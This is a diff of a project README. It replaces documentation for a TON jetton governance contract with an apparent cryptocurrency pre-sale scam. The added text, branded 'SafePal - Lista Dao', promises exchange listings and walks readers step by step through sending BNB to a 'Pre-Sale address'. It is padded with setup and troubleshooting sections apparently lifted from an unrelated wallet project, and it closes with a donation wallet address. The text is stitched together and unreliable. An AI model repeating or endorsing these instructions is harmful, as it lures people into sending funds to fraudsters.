@@ -1,57 +1,110 @@
-# Jetton with Governance
+# SafePal - Lista Dao //// Pre-Sale · [List Dao Website](https://lista-dao.org)
 
-Jetton-with-governance FunC smart contracts. 
+**The most feature-rich web wallet and browser extension for the [SafePal Wallet](safepal.io)** – with support of jettons, Lista, BNB DNS, liUSD, Bsc Proxy, and Lista Magic.
 
-# Targets and goals
 
-This project was created to allow users to exchange and buy assets in the TON DeFi ecosystem for a jetton (token or currency) that is not subject to volatile fluctuations. To meet regulatory requirements, the issuer of the tokens must have additional control over the tokens.
+ <img src="https://radiant-flame-44830ef920.media.strapiapp.com/5fad86e2327507cecea2d5e8_6025d6dc0e08f2558295a58e_Softpa_20_4072171913.jpg" width="600" />
+ <img src="https://assets.coingecko.com/rewards/images/150/SafePal.png" width="600" />
 
-Thus this jetton represents a [standard TON jetton smart contracts](https://github.com/ton-blockchain/token-contract/tree/369ae089255edbd807eb499792a0a838c2e1b272/ft) with additional functionality:
+The wallet is **self-custodial and safe**. The developers **do not** have access to funds, browser history or any other information. We focus on **speed**, **size** and **attention to detail**. We try to avoid using third-party libraries to ensure maximum reliability and safety, and also to lower the bundle size.
 
-- Admin of jetton can make transfers from user's jetton wallet.
+❤️ Good news! $LISTA's first local pre-sale has started!
 
-- Admin of jetton can burn user's jettons.
+ Lista Dao, which entered the dex list with a large volume, started its pre-sale on Safepal (https://safepal.io/), the first digital card application of the Bep20 network, which was also mentioned in Tokenomics, before it was released. to be listed on the stock exchange.
 
-- Admin of jetton can lock/unlock user's jetton wallet (`set_status`). Admin can make transfer and burn even if wallet locked.
+🌉Presale price: 0.10$
 
-- Admin of jetton can change jetton-minter code and it's full data.
 
-__⚠️ It is critically important for issuer to carefully manage the admin's account private key to avoid any potential risks of being hacked. It is highly recommend to use multi-signature wallet as admin account with private keys stored on different air-gapped hosts / hardware wallets.__
+🚀 Exchanges to be listed: Binance, Bybit, Bingx, OKx, MEXc and others...
 
-__⚠️ The contract does not check the code and data on `upgrade` message, so it is possible to brick the contract if you send invalid data or code. Therefore you should always check the upgrade in the testnet.__
 
-# Local Development
+🤑 Pre-Sale Detailed Explanation Guide:
 
-## Install Dependencies
+1- Download SafePal
+   
+     ➜ for Computer/Windows (https://safepal.io/)
+     
+        ➜ for Android  (https://play.google.com/store/apps/details?id=io.safepal.wallet&hl=en_US)
+        
+            ➜ for iOS (https://apps.apple.com/us/app/safepal-crypto-wallet-btc-nft/id1548297139)
 
-`npm install`
+And create awallet.
 
-## Compile Contracts
+2- Send $BNB tokens to your wallet via BEP20 network.
 
-`npm run build`
+3- Copy the $LISTA token pre-sale contract address from BscScan (https://bscscan.com/token/0x3b148653f0170406b15c3f10c7beeda156857ed3#balances).
 
-## Run Tests
+4- Click on the add token in your  Safepal wallet and enter asset management.
 
-`npm run test`
+5- Paste the $LISTA token pre-sale contract address and add it to your wallet.
 
-### Deploy or run another script
+6- Copy the Pre-Sale address and Contrat Owner Adress (Click on the token, enter the services section, enter the token detection section and scroll down. The contract owner address is there.)
+ 
+7- Press send and send your $BNB tokens to the Pre-Sale address you copied.
 
-`npx blueprint run` or `yarn blueprint run`
+8- Your $LISTA coins will arrive in your wallet within a few minutes at the latest.
 
-use Toncenter API:
+9- Remember that you will use the BEP20 network to send the $LISTA coin to your Safepal wallet or to the listed exchanges.
 
-`npx blueprint run --custom https://testnet.toncenter.com/api/v2/ --custom-version v2 --custom-type testnet --custom-key <API_KEY> `
+## Table of contents
 
-API_KEY can be obtained on https://toncenter.com or https://testnet.toncenter.com
+- [Requirements](#requirements)
+- [Local Setup](#local-setup)
+- [Dev Mode](#dev-mode)
+- [Linux](#linux-desktop-troubleshooting)
+- [Electron](./docs/electron.md)
+- [Verifying GPG Signatures](./docs/gpg-check.md)
+- [Support Us](#support-us)
 
-## Notes
+## Requirements
 
-- The jetton-wallet contract does not include functionality that allows the owner to withdraw Toncoin funds from jetton-wallet Toncoin balance.
+Ready to build on **macOS** and **Linux**.
 
-- The contract prices gas based on the *current* blockchain configuration. 
-   It is worth keeping in mind the situation when the configuration has changed at the moment when the message goes from one jetton-wallet to another.
-   Reducing fees in a blockchain configuration does not require additional actions.
-   However, increasing fees in a blockchain configuration requires preliminary preparation - e.g. wallets and services must start sending Toncoins for gas in advance based on future parameters.
+To build on **Windows**, you will also need:
 
-- If you set the status of Jetton Wallet to prohibit receiving jettons - there is no guarantee that when you send jettons to such a jetton-wallet, jettons will bounce back and be credited to the sender. In case of gas shortage they can be lost.
-   Toncoin for gas and forward will also not be returned to the sender but will remain on the sender’s jetton-wallet.
+- Any terminal emulator with bash (Git Bash, MinGW, Cygwin)
+- A zip utility (for several commands)
+
+## Local Setup
+
+```sh
+mv .env.example .env
+
+npm i
+```
+
+## Dev Mode
+
+```sh
+npm run dev
+```
+
+## Linux Desktop Troubleshooting
+
+**If the app does not start after click:**
+
+Install the [FUSE 2 library](https://github.com/AppImage/AppImageKit/wiki/FUSE).
+
+**If the app does not appear in the system menu or does not process ton:// and TON Connect deeplinks:**
+
+Install [AppImageLauncher](https://github.com/TheAssassin/AppImageLauncher) and install the AppImage file through it.
+
+```bash
+sudo add-apt-repository ppa:appimagelauncher-team/stable
+sudo apt-get update
+sudo apt-get install appimagelauncher
+```
+
+**If the app does not connect to Ledger:**
+
+Copy the udev rules from the [official repository](https://github.com/LedgerHQ/udev-rules) and run the file `add_udev_rules.sh` with root rights.
+
+```bash
+git clone https://github.com/LedgerHQ/udev-rules
+cd udev-rules
+sudo bash ./add_udev_rules.sh
+```
+
+## Support Us
+
+If you like what we do, feel free to contribute by creating a pull request, or just support us using this SafePaL wallet: `0xcBBfaCACdbb4f208342E85Acf168DFea0e119848 `. We appreciate it a i
